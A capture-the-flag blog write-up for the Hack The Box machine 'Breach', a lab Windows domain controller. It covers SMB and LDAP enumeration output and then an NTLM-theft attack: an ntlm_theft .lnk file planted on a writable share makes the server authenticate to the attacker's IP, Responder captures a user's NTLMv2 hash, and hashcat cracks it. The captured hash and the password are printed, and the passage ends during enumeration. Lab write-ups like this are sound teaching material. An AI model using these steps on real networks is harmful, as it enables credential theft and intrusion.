---
layout: posts
title: "HTB — Breach Writeup"
date: 2026-02-25
tags: [htb, writeup, windows, web, active directory]
categories: [ctf]
---

## Overview

- **Machine:** Breach
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Medium

Breach is a medium-difficulty machine that requires a solid understanding of Active Directory fundamentals. It’s a very enjoyable box that showcases several common misconfigurations within an AD environment. Although classified as medium, it serves as an excellent learning platform for building and reinforcing your Active Directory basics.

---

## Initial Enumeration

### Nmap Scan

```bash
Nmap scan report for 10.129.6.251
Host is up (0.031s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-24 17:29:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2026-02-23T17:23:47
|_Not valid after:  2026-08-25T17:23:47
|_ssl-date: 2026-02-24T17:31:12+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-24T17:30:33+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49922/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-24T17:30:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 341.39 seconds
```

As expected with an Active Directory machine, we see several open ports related to core services like LDAP, SMB, RPC, Kerberos, and DNS.

One interesting detail is port 80, which isn’t always present on domain controllers and could provide an additional attack surface.

Before starting enumeration, I’ll add the domain name and hostname to my /etc/hosts file to ensure proper name resolution.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ cat /etc/hosts           
127.0.0.1 localhost
127.0.1.1 kali 
10.129.6.251 breach.vl BREACH BREACHDC.breach.vl BREACHDC
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

### Enum4linux

I always like to start with an initial enum4linux-ng scan without credentials, sometimes you can grab some low-hanging fruit right away.

Even if anonymous access is limited, enum4linux-ng can still provide useful information, such as the domain SID, basic domain details, SMB configuration, and sometimes even user or share information. It’s a quick win and helps build a clearer picture of the environment before moving into authenticated enumeration.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ enum4linux-ng breach.vl
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... breach.vl
[*] Username ......... ''
[*] Random Username .. 'eaqlxhwt'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on breach.vl    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for breach.vl    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: breach.vl

 ========================================================
|    NetBIOS Names and Workgroup/Domain for breach.vl    |
 ========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ======================================
|    SMB Dialect Check on breach.vl    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 ========================================================
|    Domain Information via SMB session for breach.vl    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: BREACHDC                                                                                                                                                                                                             
NetBIOS domain name: BREACH                                                                                                                                                                                                                 
DNS domain: breach.vl                                                                                                                                                                                                                       
FQDN: BREACHDC.breach.vl                                                                                                                                                                                                                    
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: BREACH                                                                                                                                                                                                                      

 ======================================
|    RPC Session Check on breach.vl    |
 ======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'eaqlxhwt', password ''
[H] Rerunning enumeration with user 'eaqlxhwt' might give more results

 ================================================
|    Domain Information via RPC for breach.vl    |
 ================================================
[+] Domain: BREACH
[+] Domain SID: S-1-5-21-2330692793-3312915120-706255856
[+] Membership: domain member

 ============================================
|    OS Information via RPC for breach.vl    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: ''                                                                                                                                                                                                                              
OS build: '20348'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 ==================================
|    Users via RPC on breach.vl    |
 ==================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ===================================
|    Groups via RPC on breach.vl    |
 ===================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ===================================
|    Shares via RPC on breach.vl    |
 ===================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ======================================
|    Policies via RPC for breach.vl    |
 ======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ======================================
|    Printers via RPC for breach.vl    |
 ======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 11.38 seconds
```

Nothing quite interesting here, I'll take note of the SID and move on.

### Port 80

I decided to start with port 80, as it might be the most complex.

Initially, we have a default IIS page, I'll run a dirbuster scan in the background and look for virtual hosts.

<p align="center">
  <a href="/assets/images/breach/Captura1.png" class="glightbox">
    <img src="/assets/images/breach/Captura1.png" width="700">
  </a>
</p>

Dirbuster didn't show anything of interest.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ dirb http://breach.vl/   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 25 11:27:51 2026
URL_BASE: http://breach.vl/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://breach.vl/ ----
                                                                                                                                                                                                                                           
-----------------
END_TIME: Wed Feb 25 11:30:41 2026
DOWNLOADED: 4612 - FOUND: 0
```

And no virtual hosts were discovered.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ ffuf -u http://breach.vl -H "Host: FUZZ.breach.vl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 703 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://breach.vl
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.breach.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1298 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

I'll stop with port 80 there and move on. If necessary, I can always come back and dig deeper.

### Port 445

Next, I’ll try authenticating to the domain using Guest or null credentials. For this, I’ll use smbclient, since anonymous SMB access can sometimes reveal useful shares or sensitive information.

If null or Guest access is allowed, it could give us valuable insight into users, files, or even configuration details that help move us forward.

Null session authenticate and we can list the shares in the SMB.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ smbclient -N -L //breach.vl          

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to breach.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Guest credentials also work and we can use nxc to list the readable or writables shares as Guest.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ nxc smb breach.vl -u 'Guest' -p '' --shares
SMB         10.129.8.90     445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.8.90     445    BREACHDC         [+] breach.vl\Guest: 
SMB         10.129.8.90     445    BREACHDC         [*] Enumerated shares
SMB         10.129.8.90     445    BREACHDC         Share           Permissions     Remark
SMB         10.129.8.90     445    BREACHDC         -----           -----------     ------
SMB         10.129.8.90     445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.8.90     445    BREACHDC         C$                              Default share
SMB         10.129.8.90     445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.8.90     445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.8.90     445    BREACHDC         share           READ,WRITE      
SMB         10.129.8.90     445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.8.90     445    BREACHDC         Users           READ
```

@@ Initial foothold

### share and users shares

Starting with the share named share, it's quite interesting that we can write to it. Looking at it's contents, I can see three users which I'll note. `Recurse on` will allow me to go through the share quicker.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ smbclient -U 'Guest' //breach.vl/share   
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 25 11:37:34 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

                7863807 blocks of size 4096. 1369552 blocks available
smb: \> recurse on
smb: \> ls
  .                                   D        0  Wed Feb 25 11:37:34 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

\finance
  .                                   D        0  Thu Feb 17 06:19:34 2022
  ..                                  D        0  Wed Feb 25 11:37:34 2026

\software
  .                                   D        0  Thu Feb 17 06:19:12 2022
  ..                                  D        0  Wed Feb 25 11:37:34 2026

\transfer
  .                                   D        0  Mon Sep  8 06:13:44 2025
  ..                                  D        0  Wed Feb 25 11:37:34 2026
  claire.pope                         D        0  Thu Feb 17 06:21:35 2022
  diana.pope                          D        0  Thu Feb 17 06:21:19 2022
  julia.wong                          D        0  Wed Apr 16 20:38:12 2025

\transfer\claire.pope
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*

\transfer\diana.pope
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*

\transfer\julia.wong
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*
smb: \> 
```

There's nothing of interest with our read permissions, before trying anything with the write permissions, I'll check the other share.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/smb]
└─$ smbclient -U 'Guest' //breach.vl/Users
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                  DR        0  Thu Feb 17 08:12:16 2022
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  Default                           DHR        0  Thu Feb 10 04:10:33 2022
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Public                             DR        0  Tue Sep 14 23:08:59 2021

\Default
  .                                 DHR        0  Thu Feb 10 04:10:33 2022
  ..                                 DR        0  Thu Feb 17 08:12:16 2022
  AppData                            DH        0  Thu Aug 19 02:45:22 2021
  Desktop                            DR        0  Thu Aug 19 02:24:36 2021
  Documents                          DR        0  Wed Feb  9 19:59:34 2022
  Downloads                          DR        0  Sat May  8 04:20:24 2021
  Favorites                          DR        0  Sat May  8 04:20:24 2021
  Links                              DR        0  Sat May  8 04:20:24 2021
  Music                              DR        0  Sat May  8 04:20:24 2021
  NTUSER.DAT                        AHn   524288  Thu Feb 17 10:38:01 2022
  ntuser.ini                       AHSn       20  Thu Aug 19 02:45:22 2021
  Pictures                           DR        0  Sat May  8 04:20:24 2021
  Saved Games                        Dn        0  Sat May  8 04:20:24 2021
  Videos                             DR        0  Sat May  8 04:20:24 2021

---SNIP---
...
---SNIP---
\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  .                                   D        0  Thu Feb 10 04:11:10 2022
  ..                                  D        0  Tue Sep 14 23:09:20 2021
  setwallpaper.lnk                    A     1363  Wed Apr 16 19:43:57 2025

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools
  .                                  DR        0  Sat May  8 04:20:26 2021
  ..                                  D        0  Tue Sep 14 23:09:20 2021
  Administrative Tools.lnk            A     1281  Sat May  8 04:14:58 2021
  Command Prompt.lnk                  A     1142  Sat May  8 04:14:16 2021
  computer.lnk                        A      335  Sat May  8 04:14:58 2021
  Control Panel.lnk                   A      405  Sat May  8 04:14:58 2021
  Desktop.ini                       AHS      934  Sat May  8 04:18:35 2021
  File Explorer.lnk                   A      407  Sat May  8 04:14:58 2021
  Run.lnk                             A      409  Sat May  8 04:14:58 2021
...
```

The other share goes pretty deep, and it looks like it contains the default user configuration. It seems to be the template Windows uses when creating new user profiles. I took a quick look at it but it seemed more like a rabbit hole.

### Julia credentials

Going back to the first share, whenever I see a writable SMB share, one of the first things I try is stealing NTLM credentials.

The idea is simple: create a file (like .lnk, .ini, .library-ms, .scf, etc.) that contains a UNC path pointing to my IP address. If Windows automatically processes or renders that file in Explorer, it will try to resolve the UNC path.

When that happens, the machine attempts to authenticate to my SMB server, and with a tool like Responder, I can capture the NTLM challenge-response for offline cracking or relay attacks.

For this, we'll use a very reliable tool named [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), which automates most of this process.

The usage is super simple, clone the repository and run the python script.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ git clone https://github.com/Greenwolf/ntlm_theft.git
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 151, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 151 (delta 31), reused 24 (delta 24), pack-reused 113 (from 1)
Receiving objects: 100% (151/151), 2.12 MiB | 8.03 MiB/s, done.
Resolving deltas: 100% (73/73), done.
```

I'll create a .lnk file for this test.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft]
└─$ python ntlm_theft.py -g lnk -s 10.10.14.16 -f test
/home/kali/hackthebox/breach/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.lnk (BROWSE TO FOLDER)
Generation Complete.
```

Alternatively, if it’s unclear which file extensions are actually being rendered, we can use the `-g all` option. This tells the tool to generate files for every supported extension.

That way, we cover all possible triggers. We simply drop the full batch of generated files into the writable SMB share and wait and if Windows processes any of them automatically, we should receive an NTLM authentication attempt. 

We now put the files inside the smb and set responder on.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
└─$ smbclient -U 'Guest' //breach.vl/share     
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 25 11:37:34 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

                7863807 blocks of size 4096. 1515754 blocks available
smb: \> cd transfer
smb: \transfer\> put test.lnk
putting file test.lnk as \transfer\test.lnk (21.6 kb/s) (average 21.6 kb/s)
smb: \transfer\> 
```

Inmmediately, we get a request back.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

---SNIP---
...
---SNIP---
[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.8.90
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:f0e657876e73a278:309F791A2FA28445ED7F4A47D370B3DA:01010000000000000037D73555A6DC0125EBEF6E1EF9541700000000020008004F004E003200330001001E00570049004E002D005700480059003600370059005A00590031004100330004003400570049004E002D005700480059003600370059005A0059003100410033002E004F004E00320033002E004C004F00430041004C00030014004F004E00320033002E004C004F00430041004C00050014004F004E00320033002E004C004F00430041004C00070008000037D73555A6DC01060004000200000008003000300000000000000001000000002000005EFB7EEA482AFEBE7EE3C57C9B25FE1CC0A3E36ED94816C0D2B843D3A204D1400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000                                                                                                                                                                                                                           
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
```

I'll copy the hash and try to crack it with hashcat.

```powershell
PS Z:\escritorio\hashcat> .\hashcat.exe .\Place_your_hashes_here.txt .\rockyou.txt --force
hashcat (v6.2.6) starting in autodetect mode
---SNIP---
...
---SNIP---
* Bytes.....: 139921497
* Keyspace..: 14344384

JULIA.WONG::BREACH:f0e657876e73a278:309f791a2fa28445ed7f4a47d370b3da:01010000000000000037d73555a6dc0125ebef6e1ef9541700000000020008004f004e003200330001001e00570049004e002d005700480059003600370059005a00590031004100330004003400570049004e002d005700480059003600370059005a0059003100410033002e004f004e00320033002e004c004f00430041004c00030014004f004e00320033002e004c004f00430041004c00050014004f004e00320033002e004c004f00430041004c00070008000037d73555a6dc01060004000200000008003000300000000000000001000000002000005efb7eea482afebe7ee3c57c9b25fe1cc0a3e36ed94816c0d2b843d3a204d1400a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310036000000000000000000:Computer1
```

After just some seconds, the hash cracked succesfully and we have the credentials of julia.wong.

## Lateral Movement

### More enumration

First thing I'll check with the newly obtained credentials is to run another enum4linux scan, as well as re-check the shares in smb. While we do this, it's good to let Bloodhound collect the data in the background.

<details>
<summary><strong>enum4linux-ng Output</strong></summary>

<pre><code>
#
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
└─$ enum4linux-ng -u julia.wong -p 'Computer1' breach.vl
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... breach.vl
[*] Username ......... 'julia.wong'
[*] Random Username .. 'vavofpix'
[*] Password ......... 'Computer1'
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on breach.vl    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for breach.vl    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: breach.vl

 ========================================================
|    NetBIOS Names and Workgroup/Domain for breach.vl    |
 ========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ======================================
|    SMB Dialect Check on breach.vl    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 ========================================================
|    Domain Information via SMB session for breach.vl    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: BREACHDC                                                                                                                                                                                                             
NetBIOS domain name: BREACH                                                                                                                                                                                                                 
DNS domain: breach.vl                                                                                                                                                                                                                       
FQDN: BREACHDC.breach.vl                                                                                                                                                                                                                    
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: BREACH                                                                                                                                                                                                                      

 ======================================
|    RPC Session Check on breach.vl    |
 ======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'julia.wong', password 'Computer1'
[*] Check for random user
[+] Server allows session using username 'vavofpix', password 'Computer1'
[H] Rerunning enumeration with user 'vavofpix' might give more results

 ================================================
|    Domain Information via RPC for breach.vl    |
 ================================================
[+] Domain: BREACH
[+] Domain SID: S-1-5-21-2330692793-3312915120-706255856
[+] Membership: domain member

 ============================================
|    OS Information via RPC for breach.vl    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: ''                                                                                                                                                                                                                              
OS build: '20348'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: '500'                                                                                                                                                                                                                          
Server type: '0x80102f'                                                                                                                                                                                                                     
Server type string: Wk Sv Sql PDC Tim NT                                                                                                                                                                                                    

 ==================================
|    Users via RPC on breach.vl    |
 ==================================
[*] Enumerating users via 'querydispinfo'
[+] Found 14 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 14 user(s) via 'enumdomusers'
[+] After merging user results we have 14 user(s) total:
'1105':                                                                                                                                                                                                                                     
  username: Claire.Pope                                                                                                                                                                                                                     
  name: Claire Pope                                                                                                                                                                                                                         
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1106':                                                                                                                                                                                                                                     
  username: Julia.Wong                                                                                                                                                                                                                      
  name: Julia Wong                                                                                                                                                                                                                          
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1107':                                                                                                                                                                                                                                     
  username: Hilary.Reed                                                                                                                                                                                                                     
  name: Hilary Reed                                                                                                                                                                                                                         
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1108':                                                                                                                                                                                                                                     
  username: Diana.Pope                                                                                                                                                                                                                      
  name: Diana Pope                                                                                                                                                                                                                          
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1109':                                                                                                                                                                                                                                     
  username: Jasmine.Price                                                                                                                                                                                                                   
  name: Jasmine Price                                                                                                                                                                                                                       
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1110':                                                                                                                                                                                                                                     
  username: George.Williams                                                                                                                                                                                                                 
  name: George Williams                                                                                                                                                                                                                     
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1111':                                                                                                                                                                                                                                     
  username: Lawrence.Kaur                                                                                                                                                                                                                   
  name: Lawrence Kaur                                                                                                                                                                                                                       
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1112':                                                                                                                                                                                                                                     
  username: Jasmine.Slater                                                                                                                                                                                                                  
  name: Jasmine Slater                                                                                                                                                                                                                      
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1113':                                                                                                                                                                                                                                     
  username: Hugh.Watts                                                                                                                                                                                                                      
  name: Hugh Watts                                                                                                                                                                                                                          
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1114':                                                                                                                                                                                                                                     
  username: Christine.Bruce                                                                                                                                                                                                                 
  name: Christine Bruce                                                                                                                                                                                                                     
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1115':                                                                                                                                                                                                                                     
  username: svc_mssql                                                                                                                                                                                                                       
  name: svc_mssql                                                                                                                                                                                                                           
  acb: '0x00000210'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'500':                                                                                                                                                                                                                                      
  username: Administrator                                                                                                                                                                                                                   
  name: (null)                                                                                                                                                                                                                              
  acb: '0x00000210'                                                                                                                                                                                                                         
  description: Built-in account for administering the computer/domain                                                                                                                                                                       
'501':                                                                                                                                                                                                                                      
  username: Guest                                                                                                                                                                                                                           
  name: (null)                                                                                                                                                                                                                              
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: Built-in account for guest access to the computer/domain                                                                                                                                                                     
'502':                                                                                                                                                                                                                                      
  username: krbtgt                                                                                                                                                                                                                          
  name: (null)                                                                                                                                                                                                                              
  acb: '0x00020011'                                                                                                                                                                                                                         
  description: Key Distribution Center Service Account                                                                                                                                                                                      

 ===================================
|    Groups via RPC on breach.vl    |
 ===================================
[*] Enumerating local groups
[+] Found 6 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 16 group(s) via 'enumdomgroups'
[+] After merging groups results we have 50 group(s) total:
'1101':                                                                                                                                                                                                                                     
  groupname: DnsAdmins                                                                                                                                                                                                                      
  type: local                                                                                                                                                                                                                               
'1102':                                                                                                                                                                                                                                     
  groupname: DnsUpdateProxy                                                                                                                                                                                                                 
  type: domain                                                                                                                                                                                                                              
'1103':                                                                                                                                                                                                                                     
  groupname: SQLServer2005SQLBrowserUser$BREACHDC                                                                                                                                                                                           
  type: local                                                                                                                                                                                                                               
'1104':                                                                                                                                                                                                                                     
  groupname: staff                                                                                                                                                                                                                          
  type: domain                                                                                                                                                                                                                              
'498':                                                                                                                                                                                                                                      
  groupname: Enterprise Read-only Domain Controllers                                                                                                                                                                                        
  type: domain                                                                                                                                                                                                                              
'512':                                                                                                                                                                                                                                      
  groupname: Domain Admins                                                                                                                                                                                                                  
  type: domain                                                                                                                                                                                                                              
'513':                                                                                                                                                                                                                                      
  groupname: Domain Users                                                                                                                                                                                                                   
  type: domain                                                                                                                                                                                                                              
'514':                                                                                                                                                                                                                                      
  groupname: Domain Guests                                                                                                                                                                                                                  
  type: domain                                                                                                                                                                                                                              
'515':                                                                                                                                                                                                                                      
  groupname: Domain Computers                                                                                                                                                                                                               
  type: domain                                                                                                                                                                                                                              
'516':                                                                                                                                                                                                                                      
  groupname: Domain Controllers                                                                                                                                                                                                             
  type: domain                                                                                                                                                                                                                              
'517':                                                                                                                                                                                                                                      
